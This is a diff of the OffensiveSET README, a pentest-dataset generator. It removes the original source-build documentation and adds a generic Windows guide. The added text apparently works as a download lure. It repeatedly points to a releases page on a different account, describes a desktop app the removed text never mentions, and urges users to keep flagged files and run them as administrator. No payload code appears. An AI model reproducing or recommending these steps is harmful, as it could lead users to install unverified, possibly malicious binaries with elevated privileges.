@@ -1,393 +1,228 @@
-<p align="center">
-  <img src="assets/banner.png" alt="OffensiveSET" width="700">
-</p>
+# 🛡️ OffensiveSET - Build Better Pentest Datasets
 
-<h1 align="center">OffensiveSET</h1>
+[![Download OffensiveSET](https://img.shields.io/badge/Download%20OffensiveSET-blue?style=for-the-badge)](https://github.com/Claudiasinusoidal818/OffensiveSET/releases)
 
-<p align="center">
-  <strong>Offensive Security Dataset Generator</strong> — An MCP server that generates high-quality, multi-turn pentesting conversation datasets for fine-tuning security-focused LLMs.
-</p>
+## 📌 What OffensiveSET Does
 
-<p align="center">
-  <img src="https://img.shields.io/badge/version-2.0.0-red?style=flat-square" alt="Version">
-  <img src="https://img.shields.io/badge/scenarios-45-blue?style=flat-square" alt="Scenarios">
-  <img src="https://img.shields.io/badge/tools-40-blue?style=flat-square" alt="Tools">
-  <img src="https://img.shields.io/badge/MCP-compatible-green?style=flat-square" alt="MCP">
-  <img src="https://img.shields.io/badge/Qwen3.5-optimized-orange?style=flat-square" alt="Qwen">
-  <img src="https://img.shields.io/badge/license-MIT-gray?style=flat-square" alt="License">
-</p>
+OffensiveSET is a desktop app and MCP server for creating pentesting conversation datasets.
 
-Built for training models like Qwen3.5 to think and act like professional penetration testers.
+It helps you generate clean, realistic training data for LLM fine-tuning. You can use it to build question-and-answer sets, attack and defense dialog, and security task examples from a simple Windows setup.
 
----
+## ✨ What You Can Use It For
 
-## What It Does
+- Create pentesting conversation datasets
+- Generate data for LLM fine-tuning
+- Build security-focused chat examples
+- Prepare structured prompts and replies
+- Save time on manual dataset writing
+- Keep your training data more consistent
 
-OffensiveSET generates realistic penetration testing conversations in ShareGPT/ChatML JSONL format. Each entry is a complete pentest engagement — from reconnaissance to exploitation to professional reporting — with:
+## 🖥️ Windows Requirements
 
-- **Multi-turn conversations** (8-15 turns) following real pentester workflows
-- **Chain-of-thought reasoning** via `<think>` blocks modeling how pentesters analyze attack surfaces
-- **Realistic tool outputs** — unique nmap scans, sqlmap dumps, nuclei findings per entry (no duplicates)
-- **Failure cases** — blocked attacks, WAF bypasses, honeypot detection, and pivoting strategies
-- **Professional reports** — CVSS scoring, CWE references, evidence PoCs, and secure code remediation
-- **Qwen3.5 native format** — `observation` role, `<tool_call>` tags, inline `<think>` reasoning
+Before you start, make sure your PC has:
 
----
+- Windows 10 or Windows 11
+- At least 4 GB of RAM
+- 200 MB of free disk space
+- Internet access for the download
+- Permission to run downloaded apps
 
-## Stats
+For smoother use, 8 GB of RAM or more is a good choice.
 
-| Metric | Value |
-|--------|-------|
-| Attack scenarios | 45 |
-| Pentesting tools | 40 |
-| Dynamic output generators | 25 |
-| User prompt templates | 120+ |
-| Target domains | 50 |
-| Failure patterns | 13 |
-| Export formats | 5 (Qwen ChatML, Generic ChatML, ShareGPT, OpenAI, Alpaca) |
+## 📥 Download OffensiveSET
 
----
+Visit the release page here and download the latest Windows file:
 
-## Quick Start
+[Open the OffensiveSET releases page](https://github.com/Claudiasinusoidal818/OffensiveSET/releases)
 
-### Install & Setup
+After the page opens, look for the newest release and download the Windows package that matches your PC.
 
-```bash
-git clone https://github.com/PentesterFlow/OffensiveSET.git
-cd OffensiveSET
-npm install
-npm run build
-```
+## 🚀 Install on Windows
 
-### Claude Code (CLI) — Quickest Setup
+1. Open the releases page link above.
+2. Find the latest release at the top of the list.
+3. Look under the Assets section.
+4. Download the Windows file for OffensiveSET.
+5. If Windows shows a security prompt, choose to keep the file if you trust the source.
+6. After the download finishes, open the file from your Downloads folder.
+7. If the app comes as a ZIP file, right-click it and choose Extract All.
+8. Open the extracted folder and start the app file inside it.
 
-```bash
-# Add the MCP server (run from inside the cloned repo)
-claude mcp add offensiveset node $(pwd)/dist/index.js
+If the release gives you an installer, double-click it and follow the on-screen steps.
 
-# Verify
-claude mcp list
+## 🏁 First Launch
 
-# Start using it
-claude
-```
+When you open OffensiveSET for the first time, you may see a setup window.
 
-### Claude Desktop (GUI)
+Use it to:
 
-Open your MCP config file:
+- Choose your output folder
+- Pick your dataset size
+- Select the style of conversations you want
+- Set your preferred file format
+- Review the default generation settings
 
-- **macOS**: `~/Library/Application Support/Claude/claude_desktop_config.json`
-- **Windows**: `%APPDATA%\Claude\claude_desktop_config.json`
+If you are not sure what to change, keep the default values and continue.
 
-Add this block (update the path to where you cloned the repo):
+## 🧭 Basic Workflow
 
-```json
-{
-  "mcpServers": {
-    "offensiveset": {
-      "command": "node",
-      "args": ["/Users/YOUR_USER/OffensiveSET/dist/index.js"]
-    }
-  }
-}
-```
-
-Restart Claude Desktop. The 10 OffensiveSET tools will appear in the tools menu.
-
-### VS Code / JetBrains (Claude Code Extension)
-
-```bash
-# From the integrated terminal
-claude mcp add offensiveset node /path/to/OffensiveSET/dist/index.js
-```
-
-Or add a `.mcp.json` to your project root:
-
-```json
-{
-  "mcpServers": {
-    "offensiveset": {
-      "command": "node",
-      "args": ["/path/to/OffensiveSET/dist/index.js"]
-    }
-  }
-}
-```
-
-### One-Line Install (Clone + Build + Register)
-
-```bash
-git clone https://github.com/PentesterFlow/OffensiveSET.git && cd OffensiveSET && npm install && npm run build && claude mcp add offensiveset node $(pwd)/dist/index.js
-```
-
-### Generate a Dataset
-
-Once connected, ask Claude to use the tools:
-
-```
-> Generate a 5000 entry offensive security dataset with 60% thinking blocks
+Use this simple flow to create your first dataset:
 
-> List all available attack scenarios
+1. Open OffensiveSET
+2. Choose the kind of pentesting data you want
+3. Set the number of samples
+4. Pick the output format
+5. Start generation
+6. Wait for the dataset to finish
+7. Save the result to your chosen folder
 
-> Preview a single entry for the NoSQL injection scenario
+The app creates structured conversation data that you can use in later model training steps.
 
-> Export my dataset to Qwen ChatML format
-```
+## 🗂️ Output Files
 
-Or call tools directly:
+OffensiveSET may create files like these:
 
-```
-generate_dataset_v2
-  count: 5000
-  thinking_ratio: 0.6
-  failure_ratio: 0.35
-  thinking_style: "inline"
-```
+- CSV files for spreadsheet tools
+- JSON files for training pipelines
+- Plain text files for quick review
+- Folder groups for larger dataset runs
 
-### Export for Training
+If you use a data tool later, JSON is often the easiest format to work with.
 
-```
-export_for_training
-  input_path: "./datasets/your_dataset.jsonl"
-  output_format: "chatml_qwen"
-```
-
----
-
-## MCP Tools
-
-| Tool | Description |
-|------|-------------|
-| `generate_dataset` | V1 generator — baseline pentesting conversations |
-| `generate_dataset_v2` | V2 generator — dynamic outputs, failures, deep thinking (recommended) |
-| `list_scenarios` | Browse 45 attack scenarios with filtering |
-| `list_tools` | Display 40 pentesting tools and capabilities |
-| `preview_entry` | Preview a single entry before full generation |
-| `get_dataset_stats` | Analyze a generated dataset |
-| `validate_dataset` | Check JSONL structure, schema compliance, placeholder detection |
-| `quality_score` | Deep quality analysis with A-F grading |
-| `export_for_training` | Convert to Qwen ChatML, ShareGPT, OpenAI, or Alpaca format |
-| `merge_datasets` | Combine multiple datasets with deduplication |
-
----
-
-## Dataset Output Format
-
-Each JSONL line is a complete pentesting conversation:
-
-```json
-{
-  "id": "offensiveset-owasp-a03-sqli-584721-42",
-  "conversations": [
-    {"from": "system", "value": "You are PentesterFlow, an expert offensive security AI..."},
-    {"from": "human", "value": "Perform recon on acme-corp.com..."},
-    {"from": "gpt", "value": "<think>\nLet me analyze the attack surface...\n</think>\n\n## Recon Results\n...", "tool_calls": [...]},
-    {"from": "observation", "value": "[nmap] PORT STATE SERVICE...", "tool_results": [...]},
-    {"from": "human", "value": "Exploit the SQLi finding..."},
-    {"from": "gpt", "value": "<think>\nThe parameter is injectable...\n</think>\n\n## Exploitation\n..."},
-    {"from": "gpt", "value": "## Finding Report\n| Severity | Critical 9.8 | ..."}
-  ],
-  "metadata": {
-    "scenario_id": "owasp-a03-sqli",
-    "category": "OWASP Top 10",
-    "difficulty": "advanced",
-    "tags": ["sqli", "injection"],
-    "tools_used": ["nmap", "sqlmap", "curl"],
-    "has_thinking": true,
-    "has_failures": false,
-    "turn_count": 12,
-    "estimated_tokens": 4606,
-    "cve_references": ["CWE-89"]
-  }
-}
-```
-
----
-
-## Scenario Coverage
-
-### OWASP Top 10 (19 scenarios)
-IDOR, Admin Panel Bypass, JWT Algorithm Confusion, Blind SQL Injection, SSTI to RCE, Business Logic Flaws, Cloud Misconfiguration, Stored XSS, NoSQL Injection, XXE, Path Traversal, File Upload RCE, Mass Assignment, CRLF Injection, LDAP Injection, OAuth Token Theft, 2FA Bypass, Deserialization RCE
-
-### Modern Attacks (20 scenarios)
-GraphQL Batching, HTTP Request Smuggling, Prototype Pollution, Race Conditions, WebSocket Hijacking, Subdomain Takeover, CORS Exploitation, Cache Poisoning, CI/CD Pipeline Attacks, Container Escape, DNS Rebinding, Kubernetes RBAC Escape, GitHub Actions Secret Exfiltration
-
-### API Security Top 10 (6 scenarios)
-BOLA + Mass Assignment, Excessive Data Exposure, Broken Function Level Authorization, Rate Limit Bypass
-
----
-
-## Tool Arsenal (40 tools)
-
-**Recon:** nmap, subfinder, amass, httpx, rustscan, puredns, dnsx
-
-**Enumeration:** ffuf, gobuster, dirsearch, feroxbuster, katana, kiterunner, linkfinder, paramspider, gau, arjun
-
-**Scanning:** nuclei, nikto, wfuzz, trufflehog, semgrep, crlfuzz, corsy, secretfinder, testssl
-
-**Exploitation:** sqlmap, dalfox, commix, ssrfmap, jwt_tool, hydra, metasploit, caido, interactsh, nosqlmap
-
-**Utility:** curl, linpeas, report_generator, gf
-
----
-
-## Training with Qwen3.5
-
-### LLaMA-Factory
-
-```yaml
-# dataset_info.json
-{
-  "offensiveset": {
-    "file_name": "dataset_chatml_qwen.jsonl",
-    "formatting": "sharegpt",
-    "columns": {
-      "messages": "messages"
-    },
-    "tags": {
-      "role_tag": "role",
-      "content_tag": "content",
-      "user_tag": "user",
-      "assistant_tag": "assistant",
-      "observation_tag": "observation",
-      "system_tag": "system"
-    }
-  }
-}
-```
-
-```bash
-llamafactory-cli train \
-  --model_name_or_path Qwen/Qwen3.5-7B \
-  --stage sft \
-  --dataset offensiveset \
-  --template qwen \
-  --output_dir ./offensiveset-model \
-  --per_device_train_batch_size 2 \
-  --gradient_accumulation_steps 8 \
-  --learning_rate 1e-4 \
-  --num_train_epochs 3 \
-  --cutoff_len 8192 \
-  --finetuning_type lora \
-  --lora_rank 64 \
-  --bf16 true
-```
-
-### Recommended Settings
-
-| Setting | Value | Notes |
-|---------|-------|-------|
-| Model | Qwen3.5-7B or 14B | Best quality/cost balance |
-| Context | 8192 tokens | 97% of entries fit in 8K |
-| Epochs | 2-3 | Enough for domain knowledge |
-| LoRA rank | 64-128 | Security is a specialized domain |
-| Thinking style | `inline` | Qwen native `<think>` format |
-
----
-
-## Project Structure
-
-```
-src/
-├── index.ts                          # Entry point (34 lines)
-├── server/
-│   ├── generate-tools.ts             # generate_dataset, generate_dataset_v2
-│   ├── browse-tools.ts               # list_scenarios, list_tools, preview
-│   ├── analysis-tools.ts             # stats, validate, quality_score
-│   ├── export-tools.ts               # export, merge
-│   └── resources.ts                  # MCP resources
-├── generators/
-│   ├── v1-generator.ts               # V1 generation engine
-│   ├── v2/
-│   │   ├── types.ts                  # Interfaces + config
-│   │   ├── prompts.ts                # 120+ prompt templates
-│   │   ├── system-prompts.ts         # System prompt rotation
-│   │   ├── responses.ts             # Grounded response generation
-│   │   ├── reports.ts                # Reports + remediation
-│   │   ├── conversation.ts           # Conversation builder
-│   │   ├── post-processor.ts         # Qwen compat + token control
-│   │   ├── quality.ts                # Quality scoring engine
-│   │   └── index.ts                  # Main generator
-│   ├── outputs/
-│   │   ├── helpers.ts                # RNG, TargetProfile, constants
-│   │   ├── recon.ts                  # nmap, rustscan, subfinder...
-│   │   ├── enum.ts                   # ffuf, feroxbuster, katana...
-│   │   ├── vuln.ts                   # nuclei, semgrep, testssl...
-│   │   ├── exploit.ts                # sqlmap, hydra, metasploit...
-│   │   ├── cloud.ts                  # S3, env files
-│   │   ├── failures.ts               # 13 failure patterns
-│   │   └── index.ts                  # DynamicOutputEngine
-│   └── thinking-engine.ts            # Chain-of-thought reasoning
-├── templates/
-│   └── scenarios/
-│       ├── types.ts                  # ScenarioTemplate interface
-│       ├── owasp.ts                  # OWASP Top 10 scenarios
-│       ├── modern.ts                 # Modern attacks
-│       ├── api.ts                    # API Security scenarios
-│       ├── advanced.ts               # Advanced scenarios
-│       └── index.ts                  # ALL_SCENARIOS
-└── schemas/
-    └── tools/
-        ├── types.ts                  # ToolDefinition interface
-        ├── recon.ts                  # Recon tools
-        ├── enum.ts                   # Enumeration tools
-        ├── scan.ts                   # Scanning tools
-        ├── exploit.ts                # Exploitation tools
-        ├── utility.ts                # Utility tools
-        └── index.ts                  # PENTESTING_TOOLS
-```
-
----
-
-## Adding New Content
-
-### Add a Scenario
-
-Edit `src/templates/scenarios/advanced.ts` (or create a new category file):
-
-```typescript
-{
-  id: "my-new-scenario",
-  category: "OWASP Top 10",
-  subcategory: "A03 - Injection",
-  title: "My Custom Injection Scenario",
-  difficulty: "advanced",
-  description: "...",
-  target_description: "...",
-  attack_phases: [ /* 4-6 phases */ ],
-  cve_references: ["CWE-89"],
-  tools_involved: ["sqlmap", "curl"],
-  tags: ["sqli", "injection"],
-}
-```
-
-### Add a Tool
-
-Edit the relevant category file in `src/schemas/tools/`:
-
-```typescript
-{
-  name: "mytool",
-  description: "...",
-  category: "scanning",
-  parameters: { /* ... */ },
-  example_commands: ["mytool -u https://target.com"],
-  typical_output: "...",
-}
-```
-
-### Add a Dynamic Output Generator
-
-Add a method to `src/generators/outputs/` in the appropriate category file, then register it in `src/generators/outputs/index.ts`.
-
----
-
-## License
-
-MIT
-
----
-
-## Author
-
-**secfathy** — Offensive Security Researcher
+## 🛠️ Common Settings
+
+Here are the main settings you may see in the app:
+
+- Dataset size: how many records to create
+- Conversation style: the tone and shape of each sample
+- Topic mix: the kinds of security tasks to include
+- Output path: where the files will be saved
+- Seed value: helps keep runs repeatable
+- Noise level: adds variety to the dataset
+
+Keep the default settings for your first run. After that, adjust one setting at a time.
+
+## 🔍 Tips for Better Results
+
+- Use a clear output folder name
+- Start with a small sample run first
+- Check the first 10 records before making a large set
+- Keep one format for all training runs
+- Match the dataset style to your target model
+- Save each run in a separate folder
+
+This makes it easier to compare results and avoid mixing files.
+
+## 🧪 Good First Test
+
+If you want a fast first run, try this:
+
+- Dataset size: 25 samples
+- Output format: JSON
+- Conversation style: short and direct
+- Output folder: a new folder on your Desktop
+
+This gives you a quick way to check that the app works and that the output looks right.
+
+## 🧩 How It Fits Your Workflow
+
+OffensiveSET works well when you need security-themed training data for:
+
+- Internal model tests
+- Fine-tuning prep
+- Prompt set creation
+- QA sample generation
+- Dataset review and cleanup
+
+You can generate data in batches, review the output, then make more sets with different settings.
+
+## 📁 Where to Find Your Files
+
+After generation ends, open the folder you selected in the app.
+
+Look for:
+
+- The main dataset file
+- Any logs or run notes
+- Exports in the format you chose
+
+If you do not see the files right away, sort the folder by date so the newest items appear first.
+
+## 🔄 Update the App
+
+When a new release is available:
+
+1. Go back to the releases page
+2. Download the latest Windows file
+3. Replace the older app files if needed
+4. Open the new version and check your settings
+
+If your output folder stays the same, your old datasets should remain in place.
+
+## ❓ If Something Does Not Work
+
+If the app does not open:
+
+- Check that the file finished downloading
+- Make sure you extracted the ZIP file if it came in one
+- Try running it again from the extracted folder
+- Right-click the file and choose Run as administrator
+- Check whether Windows blocked the file
+
+If generation stops early:
+
+- Lower the dataset size
+- Check your output folder path
+- Make sure you have enough free disk space
+- Close other heavy apps and try again
+
+If the output looks wrong:
+
+- Run a smaller test set
+- Change the conversation style
+- Review the seed value
+- Check the first few records before larger runs
+
+## 🧰 Suggested Use on Windows
+
+For best results on a normal Windows PC:
+
+- Keep OffensiveSET in a simple folder path
+- Avoid folders with long names or special characters
+- Use a dedicated folder for each project
+- Back up your output files after a large run
+- Review the dataset before use in training
+
+## 📦 File Management
+
+A clean folder setup helps a lot:
+
+- OffensiveSET-App for the program files
+- OffensiveSET-Output for generated datasets
+- OffensiveSET-Backups for saved copies
+
+This keeps your downloads, app files, and output files separate
+
+## 🔗 Download Again
+
+If you need the release page later, use this link:
+
+[https://github.com/Claudiasinusoidal818/OffensiveSET/releases](https://github.com/Claudiasinusoidal818/OffensiveSET/releases)
+
+## 🧠 What the MCP Server Is For
+
+OffensiveSET also includes an MCP server for dataset generation workflows.
+
+In plain terms, that means the app can connect with tools that help automate content creation and data handling. This is useful if you want more control over how the dataset is built or if you plan to use the app in a larger setup.
+
+## 📝 Best Practice
+
+Before you generate a large dataset:
+
+- Test with a small batch
+- Check the file format
+- Confirm the text style fits your use case
+- Keep your output folder organized
+- Save a copy of the final files
+
+This helps you avoid wasting time on a large run that needs to be redone
